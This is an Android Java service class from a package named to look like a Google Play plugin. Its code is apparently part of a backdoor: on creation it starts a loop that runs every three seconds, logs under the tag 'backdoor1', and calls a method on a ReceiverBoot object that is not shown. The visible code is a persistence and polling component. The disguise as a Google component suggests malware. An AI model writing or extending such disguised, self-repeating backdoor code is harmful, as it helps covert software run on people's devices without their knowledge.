package com.google.play.plugin.compat;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Handler;
import android.util.Log;

public class ServiceThread extends Service
{
	private static int ok = 0;
	private ReceiverBoot receAction;
	private Handler mHandler = new Handler();
	private Runnable mRefresh = new Runnable() {
		public void run() 
		{
			ok += 1;
			Log.i("kalau", "backdoor1: "+ok);
			receAction.temanCek(ServiceThread.this);

			mHandler.postDelayed(mRefresh, 3000);
		}
	};

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		receAction = new ReceiverBoot();

		mHandler.postDelayed(mRefresh, 3000);
	}
}